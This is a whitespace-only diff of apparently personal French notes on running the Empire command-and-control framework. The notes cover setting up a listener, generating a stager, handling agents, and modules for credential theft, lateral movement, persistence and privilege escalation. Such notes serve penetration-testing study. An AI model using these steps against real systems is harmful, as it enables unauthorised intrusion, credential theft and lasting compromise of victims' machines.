@@ -17,41 +17,41 @@ uselistener <wait>
 * defaultdelay - specifie le delais de reponse ( les agents ne sont pas synchronisés)
  par defaut 5s (l'agent demande des renseignement au listener) , IP deja mise, port 80
 
-set DefaultDelay 1
-set Port 9999
-set Host http://<IP>:9999
-execute
-listeners
+set DefaultDelay 1 
+set Port 9999 
+set Host http://<IP>:9999 
+execute 
+listeners 
 
 # deployer un agent
 usestager <wait> 
-options  
-set Listener <listener>
-generate
+options 
+set Listener <listener> 
+generate 
 
 
 # active agent
-agents
-help
-rename XXXX agent1
-list
-
-interact agent1
-help
-info
+agents 
+help 
+rename XXXX agent1 
+list 
+ 
+interact agent1 
+help 
+info 
 
 # modules
 usemodule <tab> 
-	*  code_execution: These modules let you run code, including Metasploit payloads, on the target box. collection: These modules let you pillage information from the target machine.
-	* credentials: These modules let you plunder usernames, hashes, and passwords from the target.
-	* exploitation: These modules let you exploit additional targets.
-	* lateral_movement: These modules let you pivot to other target machines.
-	* management: These modules are associated with system administration functions on the target.
-	* persistence: These modules will make your agent survive across user logoff or reboot.
-	* privesc: These modules provide privilege escalation exploits.
-	* recon: These are the reconnaissance modules.
-* situational_awareness: These modules pull information from the target environment, including scanners and related tools.
-    * trollsploit : troll, play audio, pop dialog
+	*  code_execution: These modules let you run code, including Metasploit payloads, on the target box. collection: These modules let you pillage information from the target machine. 
+	* credentials: These modules let you plunder usernames, hashes, and passwords from the target. 
+	* exploitation: These modules let you exploit additional targets. 
+	* lateral_movement: These modules let you pivot to other target machines. 
+	* management: These modules are associated with system administration functions on the target. 
+	* persistence: These modules will make your agent survive across user logoff or reboot. 
+	* privesc: These modules provide privilege escalation exploits. 
+	* recon: These are the reconnaissance modules. 
+* situational_awareness: These modules pull information from the target environment, including scanners and related tools. 
+    * trollsploit : troll, play audio, pop dialog 
     
     
 usemodule <wait> 
